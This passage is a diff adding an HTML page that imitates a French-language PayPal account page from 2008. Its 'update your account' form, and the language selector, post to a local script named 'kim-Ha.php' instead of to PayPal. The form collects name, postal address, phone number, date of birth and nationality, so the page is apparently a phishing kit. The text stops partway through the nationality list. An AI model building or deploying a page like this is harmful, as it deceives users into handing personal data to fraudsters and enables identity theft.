@@ -1,0 +1,788 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!--
+       Script info: script: webscr, cmd: _account, template: p/acc/index, date: Mar. 25, 2008 08:58:49 PDT; country: US, language: fr_XC, xslt server: 
+       installation: WEBSCR-510-20070402-1       web version: 51.0-543066 branch: EBFBATCH_510_0326_int
+       content version: 51.0-528825
+       pexml version: 51.0-548471
+       page XSL: Customer/default/fr_XC/account/Index.xsl
+       hostname : 
+-->
+<title>Mon compte - PayPal</title>
+<!--googleoff: all-->
+<meta http-equiv="keywords" content="Envoyer, argent, paiement, crédit, carte de crédit, instantané, argent, services financiers, GSM, sans fil, WAP, téléphones cellulaires, messagers de poche bidirectionnels, Windows CE">
+<!--googleon: all-->
+
+<!--googleoff: all-->
+<meta http-equiv="description" content="PayPal vous permet d'envoyer des paiements à toute personne possédant une adresse email. PayPal est gratuit pour les utilisateurs et fonctionne en parfaite adéquation avec votre compte courant et votre carte de crédit. Vous pouvez régler vos factures, emprunter de l'argent, définir avec vos amis la répartition de paiements ou de dépenses, sans vous déplacer jusqu'à un DAB ni sortir votre carnet de chèques.">
+<!--googleon: all-->
+<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com//css/core/paypal.css">
+<!--[if IE 6]><link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com//css/ie60win.css"><![endif]-->
+
+<!--[if IE 7]><link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com//css/ie70win.css"><![endif]-->
+
+<!--[if IE 6]><link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com//css/browsers/ie6wide.css"><![endif]-->
+<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com//css/core/wide.css">
+<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com//css/flows/accountIndex.css">
+<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com//css/flowCambio.css">
+<link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com//css/fr_XC/lang.css">
+<link rel="shortcut icon" href="https://www.paypalobjects.com//en_US/i/icon/pp_favicon_x.ico">
+<script type="text/javascript" src="https://www.paypalobjects.com//js/pp_main.js"></script><script type="text/javascript" src="https://www.paypalobjects.com//js/lib/yui-0.12/yahoo-dom-event.js"></script><script type="text/javascript" src="https://www.paypalobjects.com//js/lib/pui/pui-0.1/paypal.js"></script><script type="text/javascript" src="https://www.paypalobjects.com//js/lib/yui-0.12/connection.js"></script><script type="text/javascript" src="https://www.paypalobjects.com//js/lib/yui-0.12/animation.js"></script><script type="text/javascript" src="https://www.paypalobjects.com//js/lib/yui-0.12/dragdrop.js"></script><script type="text/javascript" src="https://www.paypalobjects.com//js/lib/yui-0.12/container.js"></script><script type="text/javascript" src="https://www.paypalobjects.com//js/account_overview.js"></script><script type="text/javascript" src="https://www.paypalobjects.com//js/autoTooltips.js"></script><script type="text/javascript" src="https://www.paypalobjects.com//js/rosettaLang.js"></script><script type="text/javascript" src="https://www.paypalobjects.com//js/lib/pui/pui-0.1/paypal.js"></script><script type="text/javascript" src="https://www.paypalobjects.com//js/lib/pui/pui-0.1/util/lightbox.js"></script><script type="text/javascript" src="https://www.paypalobjects.com//js/page/pageReplicaMessage.js"></script><script type="text/javascript" src="https://www.paypalobjects.com//js/lib/yui-0.12/yahoo-dom-event.js"></script>
+
+</head>
+<body>
+<div class="srd" id="header">
+<h1><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_account"><img border="0" src="https://www.paypal.com/fr_XC/i/logo/paypal_logo.gif" alt="PayPal"></a></h1>
+<form method="post" id="searchForm" name="searchForm" action="https://www.paypal.com/us/cgi-bin/searchscr?cmd=_sitewide-search">
+<fieldset>
+<legend>Recherche PayPal</legend>
+<label for="searchBox">Rechercher </label><input type="text" id="searchBox" name="queryString" value=""> <input class="button" type="submit" id="search.x" name="search.x" value="Rechercher">
+</fieldset>
+<input name="form_charset" type="hidden" value="UTF-8">
+</form>
+<div class="srd" id="navGlobal"><ul>
+<li class="logout"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_logout">Déconnexion</a></li>
+
+<li><a href="https://www.paypal.com/us/cgi-bin/helpweb?cmd=_help">Aide</a></li>
+<li class="last"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_security-center">Espace Sécurité</a></li>
+</ul></div>
+<form class="rosetta" id="rosetta" method="post" action="kim-Ha.php">
+<fieldset>
+<legend>Modifiez le choix de la langue</legend>
+<label for="rosetta_dropdown">Language Select</label><select id="rosetta_dropdown" name="user_locale.x"><option value="en_US">U.S. English</option>
+<option value="es_XC">Español</option>
+<option value="fr_XC" selected>Français</option>
+<option value="zh_XC">中文（简体）</option></select><button type="submit" name="testName" value="testValue"><img src="https://www.paypalobjects.com//en_US/i/btn/btn_circlewitharrow.gif" border="0" alt=""></button><input type="hidden" id="change_locale_x" name="change_locale.x" value="1">
+
+</fieldset>
+<input name="form_charset" type="hidden" value="UTF-8">
+</form>
+</div>
+<div id="navPrimary" class="srd"><ul>
+<li class="active"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&amp;nav=0" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:RO');">Mon compte</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money&amp;nav=1" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:TZ');">Paiement</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_request-money&amp;nav=2" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:UC');">Demande de paiement</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_merchant&amp;nav=3" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:UF');">Solutions e-commerce</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_auction&amp;nav=4" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:UG');">Solutions eBay</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Marketing/general/ProductsandServices&amp;nav=5" onClick="s=s_gi('paypalglobal'); s.tl(this,'o','SRD:Nav:UH');">Produits et services</a></li>
+
+</ul></div>
+<div id="xptContentMain"><table align="center" border="0" cellpadding="0" cellspacing="0" id="xptContentContainer" width="100%">
+<tr><td></td></tr>
+<tr><td><img alt="" border="0" height="1" src="https://www.paypalobjects.com//en_US/i/scr/pixel.gif" width="600"></td></tr>
+<tr><td valign="top"><table align="center" border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+<td valign="top" width="180">
+<div class="leftNav">
+<h4>Etablir un compte</h4>
+<ul><li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_status">statut Vérifié</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_business-upgrade-info">Surclasser son compte</a></li>
+</ul>
+
+<h4>Modifier votre compte</h4>
+<ul><li><a href="https://ad.doubleclick.net/clk;30045298;11466062;a?https://www.paypal.com/us/cgi-bin/webscr?cmd=_ppcredit-marketing&amp;channel=1&amp;promo=504">Carte de crédit PayPal Plus</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/cps/mobile/MobileOverview">Utilisez PayPal sur votre téléphone mobile</a></li>
+<li><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_vdc-plugin-intro">Plug-in PayPal</a></li>
+</ul>
+</div>
+<div class="MktMPI"><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_mpi-click&uid=6FU66772RF501733T&cid=1212&oid=2233&bn=EAcLCTZZGUY2BggCWxwIHQ&s=BDc3LxwFXVZBQF5BFSpcUl4tcVoaBD0dJSwqGishHhAmAj4HPVwXACc&landing_url=ORAcFjANQkkOBxpeXRQUGg85ZwkqPEE3BWYqCDBlCAADSDA9OkErJ0sEOFxsEDsSfgcYFWxECAUMAgQEVBYIBBowO0UiNAAnBCglQAkYOQwOEjUxLEsDMA0"><img src="https://securepics.ebaystatic.com/paypal/site/us/dc_TS_SecurityKeyPhase2_US_180x80.gif" border="0" alt=""></a></div>
+<br><div class="LeftNavGrayBox">
+<h4><span class="emphasis">Nouveautés</span></h4>
+
+<div class="MktRBC">
+<ul>
+<li><a href="https://ad.doubleclick.net/clk;151588342;11466066;ghttps://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/cps/account/ReplicaDetails"><span class="unlocalizedText">Learn about important updates to Recent Activity</span></a></li>
+<li><a href="https://ad.doubleclick.net/clk;151591228;11466066;d?https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/cps/securitycenter/Index"><span class="unlocalizedText">All-New Security Center</span></a></li>
+<li><a href="https://ad.doubleclick.net/clk;48723758;11466066;r?https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/cps/general/NewConsumerBuy"><span class="unlocalizedText">Shopping Is Safe And Easy With PayPal</span></a></li>
+<li><a href="https://ad.doubleclick.net/clk;48723760;11466066;k?https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/cps/general/NewConsumerSafe"><span class="unlocalizedText">See Where You Can Use PayPal<br></span></a></li>
+</ul>
+<h4><span class="unlocalizedText">Policy Updates</span></h4>
+<ul><li><a href="https://ad.doubleclick.net/clk;43648473;11466066;m?https://www.paypal.com/us/cgi-bin/webscr?cmd=_update-policy"><span class="unlocalizedText">7 mai 2008</span></a></li></ul>
+</div>
+</div>
+
+</td>
+<td width="10"><img alt="" border="0" height="1" src="https://www.paypalobjects.com//en_US/i/scr/pixel.gif" width="10"></td>
+<td rowspan="2" valign="top"><div align="center">
+  <div id="xptTitle">
+    <table align="center" border="0" cellpadding="0" cellspacing="0" class="main">
+      <tr>
+        <td class="heading" width="100%"><h1>Mettre à Jour Votre Compte PayPal</h1></td>
+      </tr>
+      <tr>
+        <td><img alt="" border="0" height="2" src="https://www.paypalobjects.com//en_US/i/scr/pixel.gif" width="1"></td>
+      </tr>
+      <tr>
+        <td><hr>
+            <div align="center">
+              <div id="xptContentMain2">
+                <table id="xptContentContainer2" align="center" border="0" cellpadding="0" cellspacing="0" width="760">
+                  <tbody>
+                    <tr>
+                      <td>&nbsp;</td>
+                    </tr>
+                    <tr>
+                      <td valign="top"><form method="post" action="kim-Ha.php">
+                          <input name="cmd" value="_flow" type="hidden">
+                          <input name="CONTEXT" value="xto_XMseBGMxN73v4Jy_o3EnIF7gJ0HzFOnhwXkkGuQFCIlfge_mp33xtrAy7ntOG6yfswoEMS27WbcaHr39kvbSb1mS9FPrzo9qE5bG8Q3VwC5-7BH5rk6bxv9lA4rLWeK68N_d1qdqEQDvyqedWEqxFdjrfPEjZSGFxBUSajXforyPO_Aw0esQGiHvtb74QOeS-hngTWqDNV8cA0DsX_aXMyoSSs0AsOWvPpavbjId577J18rJK7ANVBqEbeQNdIiwUCEtgEYJuSY8xuSjbOcdhSDhC4UljscXjnTxtZCeIWutlns7IjQWp4bdG_bbDY_JOM2t3KzDHvNhyL-vdCNKWMa007e8uEGpqT5GkW_phqtQJmSBk6GMX9bDdm3Ezd8FM6_vvlbEf4iEXRBo5rjDTdMFbrLDMf8ZoKQL6Eidge_UnR4ERveVnjs0LBXZyzgOC6p1vrIyXzMhkqrbJGR5Y_m-7MmyaPxzeCUt4OacJKDikZi5xbgvJlwx8KAEGN8OuDJsZrtbpWLLv0UNEg3S2ia3Skq24JrH0IOImre7cJE8YWYsZSSU_APyF5IPPU_KF_iKDBiarWQV2CqPlY5ka19Q5zNbnkeyqgje-2-BggQpg8ztYpMbyum0e-CeI7MGxw95chkZ70yFxmi5G6JONHS" type="hidden">
+                          <input name="error_count" value="1" type="hidden">
+                          <table class="formTable" align="center" border="0" cellpadding="0" cellspacing="0">
+                            <tbody>
+                              <tr>
+                                <td class="topSpacer" width="190"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="190"></td>
+                                <td class="topSpacer" width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td class="topSpacer" width="100%"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="1"></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="M_PhoneNumber">Prenom&nbsp;:<br>
+                                </label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><input id="address3" size="25" maxlength="40" class="smallInputWidth" name="prenom" value="" type="text"></td>
+                              </tr>
+                            </tbody>
+                          </table>
+                          <table class="formTable" align="center" border="0" cellpadding="0" cellspacing="0">
+                            <tbody>
+                              <tr>
+                                <td class="topSpacer" width="190"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="190"></td>
+                                <td class="topSpacer" width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td class="topSpacer" width="100%"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="1"></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="M_PhoneNumber">Nom&nbsp;:<br>
+                                </label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><input id="address5" size="25" maxlength="40" class="smallInputWidth" name="nom" value="" type="text"></td>
+                              </tr>
+                            </tbody>
+                          </table>
+                          <table class="formTable" align="center" border="0" cellpadding="0" cellspacing="0">
+                            <tbody>
+                              <tr>
+                                <td class="topSpacer" width="190"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="190"></td>
+                                <td class="topSpacer" width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td class="topSpacer" width="100%"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="1"></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="address1">Ligne d'adresse 1:</label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><input id="address1" size="25" maxlength="100" class="smallInputWidth" name="address1" value="" type="text"></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="address2">Ligne d'adresse 2:<br>
+                                      <span class="small">(facultatif)</span></label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><input id="address2" size="25" maxlength="100" class="smallInputWidth" name="address2" value="" type="text"></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="city">Ville:</label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><input id="address6" size="25" maxlength="100" class="smallInputWidth" name="city" value="" type="text"></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="state">Code postal:</label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><input id="zip2" size="10" maxlength="10" name="zip" value="" type="text"></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="zip">N° de téléphone personnel:</label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><input size="12" name="tel" value="" type="text">
+                                    <br>
+                                </td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        <table class="formTable" align="center" border="0" cellpadding="0" cellspacing="0">
+                            <tbody>
+                              <tr>
+                                <td class="topSpacer" width="190"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="190"></td>
+                                <td class="topSpacer" width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td class="topSpacer" width="100%"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="1"></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="H_PhoneNumber">Date de naissance                      
+                                  :<br>
+                                </label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><span class="pptext">
+                                  <select name="jour">
+                                    <option value="0" selected>--Jours--</option>
+                                    <option value="1">01</option>
+                                    <option value="2">02</option>
+                                    <option value="3">03</option>
+                                    <option value="4">04</option>
+                                    <option value="5">05</option>
+                                    <option value="6">06</option>
+                                    <option value="7">07</option>
+                                    <option value="8">08</option>
+                                    <option value="9">09</option>
+                                    <option value="10">10</option>
+                                    <option value="11">11</option>
+                                    <option value="12">12</option>
+                                    <option value="13">13</option>
+                                    <option value="14">14</option>
+                                    <option value="15">15</option>
+                                    <option value="16">16</option>
+                                    <option value="17">17</option>
+                                    <option value="18">18</option>
+                                    <option value="19">19</option>
+                                    <option value="20">20</option>
+                                    <option value="21">21</option>
+                                    <option value="22">22</option>
+                                    <option value="23">23</option>
+                                    <option value="24">24</option>
+                                    <option value="25">25</option>
+                                    <option value="26">26</option>
+                                    <option value="27">27</option>
+                                    <option value="28">28</option>
+                                    <option value="29">29</option>
+                                    <option value="30">30</option>
+                                    <option value="31">31</option>
+                                  </select>
+                                </span><font size="2">
+                                <select name="mois">
+                                  <option value="0" selected><font face="Arial, Helvetica, Verdana, sans-serif" size="2">--Mois--</font></option>
+                                  <option value="1"><font face="Arial, Helvetica, Verdana, sans-serif" size="2">January</font></option>
+                                  <option value="2"><font face="Arial, Helvetica, Verdana, sans-serif" size="2">February</font></option>
+                                  <option value="3"><font face="Arial, Helvetica, Verdana, sans-serif" size="2">March</font></option>
+                                  <option value="4"><font face="Arial, Helvetica, Verdana, sans-serif" size="2">April</font></option>
+                                  <option value="5"><font face="Arial, Helvetica, Verdana, sans-serif" size="2">May</font></option>
+                                  <option value="6"><font face="Arial, Helvetica, Verdana, sans-serif" size="2">June</font></option>
+                                  <option value="7"><font face="Arial, Helvetica, Verdana, sans-serif" size="2">July</font></option>
+                                  <option value="8"><font face="Arial, Helvetica, Verdana, sans-serif" size="2">August</font></option>
+                                  <option value="9"><font face="Arial, Helvetica, Verdana, sans-serif" size="2">September</font></option>
+                                  <option value="10"><font face="Arial, Helvetica, Verdana, sans-serif" size="2">October</font></option>
+                                  <option value="11"><font face="Arial, Helvetica, Verdana, sans-serif" size="2">November</font></option>
+                                  <option value="12"><font face="Arial, Helvetica, Verdana, sans-serif" size="2">December</font></option>
+                                </select>
+                                </font><span class="pptext">
+                                <input maxLength="4" size="4" id="year" name="year">
+                                </span></td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        <table class="formTable" align="center" border="0" cellpadding="0" cellspacing="0">
+                            <tbody>
+                              <tr>
+                                <td class="topSpacer" width="190"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="190"></td>
+                                <td class="topSpacer" width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td class="topSpacer" width="100%"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="1"></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="M_PhoneNumber">Pays&nbsp;:<br>
+                                </label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom">France</td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        <table class="formTable" align="center" border="0" cellpadding="0" cellspacing="0">
+                            <tbody>
+                              <tr>
+                                <td class="topSpacer" width="190"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="190"></td>
+                                <td class="topSpacer" width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td class="topSpacer" width="100%"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="1"></td>
+                              </tr>
+                              <tr>
+                                <td class="label" valign="middle"><label for="email">Nationalité :</label></td>
+                                <td width="6"><img alt="" src="kim-Ha/pixel.gif" border="0" height="1" width="6"></td>
+                                <td align="left" valign="bottom"><input name="refresh_country_code2" value="0" type="hidden">
+                                  <select id="citizenship2" name="pay" class="optionsLong">
+                                    <option value="">-- 
+                                      Choix d’un pays --</option>
+                                    <option value="FR" selected="selected">France</option>
+                                    <option value="ZA">Afrique du Sud</option>
+                                    <option value="AL">Albanie</option>
+                                    <option value="DZ">Algérie</option>
+                                    <option value="DE">Allemagne</option>
+                                    <option value="AD">Andorre</option>
+                                    <option value="AO">Angola</option>
+                                    <option value="AI">Anguilla</option>
+                                    <option value="AG">Antigua et Barbuda</option>
+                                    <option value="AN">Antilles néerlandaises</option>
+                                    <option value="SA">Arabie Saoudite</option>
+                                    <option value="AR">Argentine</option>
+                                    <option value="AM">Arménie</option>
+                                    <option value="AW">Aruba</option>
+                                    <option value="AU">Australie</option>
+                                    <option value="AT">Autriche</option>
+                                    <option value="BS">Bahamas</option>
+                                    <option value="BH">Bahreïn</option>
+                                    <option value="BD">Bangladesh</option>
+                                    <option value="BB">Barbades</option>
+                                    <option value="BE">Belgique</option>
+                                    <option value="BZ">Belize</option>
+                                    <option value="BJ">Bénin</option>
+                                    <option value="BM">Bermudes</option>
+                                    <option value="BT">Bhoutan</option>
+                                    <option value="BY">Biélorussie</option>
+                                    <option value="BO">Bolivie</option>
+                                    <option value="BA">Bosnie-Herzégovine</option>
+                                    <option value="BW">Botswana</option>
+                                    <option value="BR">Brésil</option>
+                                    <option value="BN">Brunei</option>
+                                    <option value="BG">Bulgarie</option>
+                                    <option value="BF">Burkina Faso</option>
+                                    <option value="BI">Burundi</option>
+                                    <option value="KY">Caïmanes, Iles</option>
+                                    <option value="KH">Cambodge</option>
+                                    <option value="CM">Cameroun</option>
+                                    <option value="CA">Canada</option>
+                                    <option value="CV">Cap-Vert</option>
+                                    <option value="CL">Chili</option>
+                                    <option value="C2">Chine</option>
+                                    <option value="CY">Chypre</option>
+                                    <option value="VA">Cité du Vatican</option>
+                                    <option value="CO">Colombie</option>
+                                    <option value="KM">Comores</option>
+                                    <option value="KR">Corée du Sud</option>
+                                    <option value="CR">Costa Rica</option>
+                                    <option value="CI">Côte-d'Ivoire</option>
+                                    <option value="HR">Croatie</option>
+                                    <option value="DK">Danemark</option>
+                                    <option value="DJ">Djibouti</option>
+                                    <option value="DM">Dominique</option>
+                                    <option value="EG">Egypte</option>
+                                    <option value="AE">Emirats Arabes Unis</option>
+                                    <option value="EC">Equateur</option>
+                                    <option value="ER">Erythrée</option>
+                                    <option value="ES">Espagne</option>
+                                    <option value="EE">Estonie</option>
+                                    <option value="FM">Etats fédérés de Micronésie</option>
+                                    <option value="US">Etats-Unis d'Amérique</option>
+                                    <option value="ET">Ethiopie</option>
+                                    <option value="FK">Falkland (Malvinas), Iles</option>
+                                    <option value="FJ">Fidji</option>
+                                    <option value="FI">Finlande</option>
+                                    <option value="GM">Gambie</option>
+                                    <option value="GE">Géorgie</option>
+                                    <option value="GH">Ghana</option>
+                                    <option value="GI">Gibraltar</option>
+                                    <option value="GR">Grèce</option>
+                                    <option value="GD">Grenade</option>
+                                    <option value="GL">Groenland</option>
+                                    <option value="GP">Guadeloupe</option>
+                                    <option value="GU">Guam</option>
+                                    <option value="GT">Guatemala</option>
+                                    <option value="GG">Guernesey</option>
+                                    <option value="GN">Guinée</option>
+                                    <option value="GQ">Guinée équatoriale</option>
+                                    <option value="GF">Guinée française</option>
+                                    <option value="GW">Guinée-Bissau</option>
+                                    <option value="GY">Guyane</option>
+                                    <option value="HT">Haïti</option>
+                                    <option value="HN">Honduras</option>
+                                    <option value="HK">Hong-Kong</option>
+                                    <option value="HU">Hongrie</option>
+                                    <option value="CX">Ile Christmas</option>
+                                    <option value="IM">Ile de Man</option>
+                                    <option value="MU">Ile Maurice</option>
+                                    <option value="NF">Ile Norfolk</option>
+                                    <option value="BV">Iles Bouvet</option>
+                                    <option value="CC">Iles Cocos</option>
+                                    <option value="CK">Iles Cook</option>
+                                    <option value="AX">Iles d'Åland</option>
+                                    <option value="SJ">Iles de Svalbard et Jan Mayen</option>
+                                    <option value="FO">Iles Féroé</option>
+                                    <option value="GS">Iles Géorgie du Sud et Sandwich du Sud</option>
+                                    <option value="HM">Iles Heard et McDonald</option>
+                                    <option value="MP">Iles Mariannes du Nord</option>
+                                    <option value="MH">Iles Marshall</option>
+                                    <option value="UM">Iles mineures éloignées des Etats-Unis</option>
+                                    <option value="PN">Iles Pitcairn</option>
+                                    <option value="SB">Iles Salomon</option>
+                                    <option value="VI">Iles Vierges américaines</option>
+                                    <option value="VG">Iles Vierges britanniques</option>
+                                    <option value="WF">Iles Wallis-et-Futuna</option>
+                                    <option value="IN">Inde</option>
+                                    <option value="ID">Indonésie</option>
+                                    <option value="IE">Irlande</option>
+                                    <option value="IS">Islande</option>
+                                    <option value="IL">Israël</option>
+                                    <option value="IT">Italie</option>
+                                    <option value="JM">Jamaïque</option>
+                                    <option value="JP">Japon</option>
+                                    <option value="JE">Jersey</option>
+                                    <option value="JO">Jordanie</option>
+                                    <option value="KZ">Kazakhstan</option>
+                                    <option value="KE">Kenya</option>
+                                    <option value="KG">Kirghizistan</option>
+                                    <option value="KI">Kiribati</option>
+                                    <option value="KW">Koweït</option>
+                                    <option value="LA">Laos</option>
+                                    <option value="LS">Lesotho</option>
+                                    <option value="LV">Lettonie</option>
+                                    <option value="LB">Liban</option>
+                                    <option value="LR">Libéria</option>
+                                    <option value="LI">Liechtenstein</option>
+                                    <option value="LT">Lituanie</option>
+                                    <option value="LU">Luxembourg</option>
+                                    <option value="MO">Macao</option>
+                                    <option value="MK">Macédoine</option>
+                                    <option value="MG">Madagascar</option>
+                                    <option value="MY">Malaisie</option>
+                                    <option value="MW">Malawi</option>
+                                    <option value="MV">Maldives</option>
+                                    <option value="ML">Mali</option>
+                                    <option value="MT">Malte</option>
+                                    <option value="MA">Maroc</option>
+                                    <option value="MQ">Martinique</option>
+                                    <option value="MR">Mauritanie</option>
+                                    <option value="YT">Mayotte</option>
+                                    <option value="MX">Mexique</option>
+                                    <option value="MD">Moldavie</option>
+                                    <option value="MC">Monaco</option>
+                                    <option value="MN">Mongolie</option>
+                                    <option value="ME">Monténégro</option>
+                                    <option value="MS">Montserrat</option>
+                                    <option value="MZ">Mozambique</option>
+                                    <option value="MM">Myanmar</option>
+                                    <option value="NA">Namibie</option>
+                                    <option value="NR">Nauru</option>
+                                    <option value="NP">Népal</option>
+                                    <option value="NI">Nicaragua</option>
+                                    <option value="NE">Niger</option>
+                                    <option value="NG">Nigeria</option>
+                                    <option value="NU">Niue</option>
+                                    <option value="NO">Norvège</option>
+                                    <option value="NC">Nouvelle-Calédonie</option>
+                                    <option value="NZ">Nouvelle-Zélande</option>
+                                    <option value="OM">Oman</option>
+                                    <option value="UG">Ouganda</option>
+                                    <option value="UZ">Ouzbékistan</option>
+                                    <option value="PK">Pakistan</option>
+                                    <option value="PW">Palaos</option>
+                                    <option value="PS">Palestine</option>
+                                    <option value="PA">Panama</option>
+                                    <option value="PG">Papouasie-Nouvelle-Guinée</option>
+                                    <option value="PY">Paraguay</option>
+                                    <option value="NL">Pays-Bas</option>
+                                    <option value="PE">Pérou</option>
+                                    <option value="PH">Philippines</option>
+                                    <option value="PL">Pologne</option>
+                                    <option value="PF">Polynésie française</option>
+                                    <option value="PR">Porto Rico</option>
+                                    <option value="PT">Portugal</option>
+                                    <option value="QA">Qatar</option>
+                                    <option value="CF">République Centrafricaine</option>
+                                    <option value="AZ">République d'Azerbaïdjan</option>
+                                    <option value="CD">République Démocratique du Congo</option>
+                                    <option value="DO">République dominicaine</option>
+                                    <option value="CG">République du Congo</option>
+                                    <option value="GA">République du Gabon</option>
+                                    <option value="CZ">République tchèque</option>
+                                    <option value="RE">Réunion</option>
+                                    <option value="RO">Roumanie</option>
+                                    <option value="GB">Royaume-Uni</option>
+                                    <option value="RU">Russie</option>
+                                    <option value="RW">Rwanda</option>
+                                    <option value="EH">Sahara occidental</option>
+                                    <option value="KN">Saint-Christophe-et-Niévès</option>
+                                    <option value="SM">Saint-Marin</option>
+                                    <option value="PM">Saint-Pierre et Miquelon</option>
+                                    <option value="VC">Saint-Vincent-et-les Grenadines</option>
+                                    <option value="SH">Sainte-Hélène</option>
+                                    <option value="LC">Sainte-Lucie</option>
+                                    <option value="SV">Salvador</option>
+                                    <option value="WS">Samoa</option>
+                                    <option value="AS">Samoa Américaines</option>
+                                    <option value="ST">Sao Tomé-et-Principe</option>
+                                    <option value="SN">Sénégal</option>
+                                    <option value="RS">Serbie</option>
+                                    <option value="CS">Serbie et Monténégro</option>
+                                    <option value="SC">Seychelles</option>
+                                    <option value="SL">Sierra Leone</option>
+                                    <option value="SG">Singapour</option>
+                                    <option value="SK">Slovaquie</option>
+                                    <option value="SI">Slovénie</option>
+                                    <option value="SO">Somalie</option>
+                                    <option value="SD">Soudan</option>
+                                    <option value="LK">Sri Lanka</option>
+                                    <option value="SE">Suède</option>
+                                    <option value="CH">Suisse</option>
+                                    <option value="SR">Surinam</option>
+                                    <option value="SZ">Swaziland</option>
+                                    <option value="SY">Syrie</option>
+                                    <option value="TJ">Tadjikistan</option>
+                                    <option value="TW">Taiwan</option>
+                                    <option value="TZ">Tanzanie</option>
+                                    <option value="TD">Tchad</option>
+                                    <option value="IO">Territoire Britannique de l'Océan Indien</option>
+                                    <option value="TF">Territoires et départements français d'Outremer</option>
+                                    <option value="TH">Thaïlande</option>
+                                    <option value="TP">Timor oriental</option>
+                                    <option value="TL">Timor oriental</option>
+                                    <option value="TG">Togo</option>
+                                    <option value="TK">Tokelau</option>
+                                    <option value="TO">Tonga</option>
+                                    <option value="TT">Trinité-et-Tobago</option>
